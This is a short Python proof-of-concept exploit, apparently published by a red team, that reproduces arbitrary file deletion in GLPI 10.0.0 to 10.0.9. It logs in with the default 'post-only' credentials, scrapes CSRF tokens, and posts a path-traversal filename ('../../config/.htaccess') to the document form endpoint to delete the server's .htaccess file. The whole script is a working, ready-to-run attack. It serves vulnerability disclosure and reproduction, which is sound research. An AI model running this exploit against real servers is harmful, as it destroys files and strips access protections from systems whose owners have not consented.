# NEVERHACK Group
# Vulnerability Research by NEVERHACK RED TEAM
# Script to reproduce file deletion on GLPI 10.0.0 to 10.0.9
# Contact :
# grobert@neverhack.com
# mbillaux@neverhack.com
# mmenuet@neverhack.com

import requests
import re
import argparse
import time
import json
from bs4 import BeautifulSoup

USERNAME = 'post-only'
PASSWORD = 'postonly'

parser = argparse.ArgumentParser()
parser.add_argument('host')
args = parser.parse_args()

session = requests.session()

r = session.get(args.host + '/index.php')

html = BeautifulSoup(r.text, 'html.parser')
login_name = html.find('input', id='login_name').get('name')
login_password = html.find('input', id='login_password').get('name')
login_remember = html.find('input', id='login_remember').get('name')

search = re.search('name="_glpi_csrf_token" value="([^"]+)"', r.text)
csrf = search.group(1)


r = session.post(args.host + '/front/login.php', data={
    login_name: USERNAME,
    login_password: PASSWORD,
    login_remember: 'on',
    '_glpi_csrf_token': csrf
})

search = re.search('glpi:csrf_token" content="([^"]+)"', r.text)
csrf = search.group(1)

data = {"_filename[]": "../../config/.htaccess", "add": "1", "_prefix_filename[]": "", '_glpi_csrf_token': csrf}
session.post(args.host + '/front/document.form.php', data=data)

